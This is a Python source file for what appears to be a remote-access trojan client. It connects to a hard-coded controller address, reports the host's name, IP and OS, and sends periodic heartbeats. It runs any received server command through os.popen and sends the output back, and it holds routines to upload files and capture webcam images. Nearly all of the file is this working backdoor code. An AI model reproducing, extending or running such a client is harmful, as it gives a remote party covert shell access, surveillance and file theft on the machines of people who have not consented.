import socket
import os
import time
import threading
import platform
import cv2

class Application(object):
    def __init__(self):
        super().__init__()
        self.port = 12345
        self.address = '192.168.178.111'
        self.socket = None
        self.connected = False
        self.connect()

    def connect(self):
        while self.socket is None:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.address, self.port))
                self.connected = True
                print(f"Connected to server at ({self.address}/{self.port})")
                self.send_information("Connected with Server")
                self.send_information("Information")
                self.send_System_informaton()

                # Starte einen neuen Thread für die Informationsübertragung
                threading.Thread(target=self.periodic_information_send, daemon=True).start()
                threading.Thread(target=self.recvCommands_fromServer,daemon=True).start()
            except (ConnectionRefusedError, OSError) as e:
                print(f"Could not connect to server, retrying in 5 seconds: {e}")
                #time.sleep(5)
                self.connect()

    def send_information(self, information):
        try:
            # Senden Sie das Protokoll im UTF-Format, damit der Java-Server es richtig lesen kann.
            message_with_prefix = f"INFO {information}"
            self.socket.sendall((message_with_prefix + "\n").encode("utf-8"))
            print("Sent: ", message_with_prefix)
            response = self.socket.recv(1024).decode()
            print(f"Server Response: {response}")
            if "SERVERCOMMAND" in str(response):
                print(f"handeling Command: {response}")
                self.handleCOmmand(response)
            
        except (BrokenPipeError, ConnectionResetError) as e:
            print(f"Connection lost: {e}")
            self.connected = False
            self.socket = None
            self.connect()

    def send_file_information(self,file_path):
        if not os.path.exists(file_path):
            print("File not found!")
            self.send_information("File not found!")
            return
        try:
            message_prefix_name = f"FILE INFO NAME "
            message_prefix_size = f"FILE INFO SIZE "
            filename = os.path.basename(file_path)
            filesize = os.path.getsize(file_path)

            self.socket.sendall((message_prefix_name+filename + "\n").encode("utf-8"))
            self.socket.sendall((message_prefix_size+str(filesize) + "\n").encode("utf-8"))

        except (BrokenPipeError, ConnectionResetError) as error:
            print("Lost Connection while Transfer")
            self.connect()

    def send_System_informaton(self):
        self.send_information(f"DEVICENAME {socket.gethostname()}")
        self.send_information(f"IPADRESS {socket.gethostbyname(socket.gethostname())}")
        self.send_information(f"OS_NAME {platform.system()}")
        self.send_information(f"OS_VERSION {platform.release()}")
        #self.send_file(self.record_webcam_image())
        #self.send_file_information(self.record_webcam_image())

    def send_file(self, file_path):
        if not os.path.exists(file_path):
            print("File not found!")
            self.send_information("File not found!")
            return
        try:
            self.send_file_information(file_path)

            with open(file_path, "rb") as file:
                while chunk := file.read(1024):
                    self.socket.sendall(chunk)
            response = self.socket.recv(1024).decode()
            print(f"Server Response: {response}")
        except (BrokenPipeError, ConnectionResetError) as e:
            print(f"Connection lost while sending file: {e}")
            self.connected = False
            self.socket = None
            self.connect()

    def periodic_information_send(self):
        while self.connected:
            time.sleep(10)  # Alle 10 Sekunden Informationen senden
            self.send_information("Heartbeat Message")  # Sende einen Heartbeat oder Status

    def recvCommands_fromServer(self):
        while self.connected:
            command = self.socket.recv(1024).decode()
            if ("SERVER_COMMAND " in command):
                print(f"Recieved Command: {command}")
                self.handleCOmmand(command)

    def handleCOmmand(self,command):
        #CHeck if command in right format

        realcommand = str(command).replace("SERVERCOMMAND","")

        if "CMD" in realcommand:
            #realcommand = "SERVERCOMMAND CMD 1 echo out"
            realcommand = realcommand.replace("CMD","")
            realcommand = realcommand.replace("SERVERCOMMAND","")

            dic = realcommand.split(" ")
            print(f"Got dir = {dic}")
            id = dic[1]
            print(f"id: "+id)
            tempid = id
            realcommand = realcommand.replace(id,"")
            stream = os.popen(realcommand)
            output = stream.read()
            print(f"Got Following output: {output}")

            self.send_information(f"CMD_OUTPUT {tempid} {output}")
            print("Executed cmd Command: {realcommand}")


    def record_webcam_image(self):
        vc = cv2.VideoCapture(0)

        result, image = vc.read()
        if (result):
            img = "picture.png"
            cv2.imwrite(img,image)
            return img
        else:
            print("Failed")
            return "failed.png"

app = Application()

# Hauptschleife für Benutzereingaben oder andere Aktionen
while True:
    try:
        pass
    except Exception as e:
        print(f"Error: {e}")
        app.connect()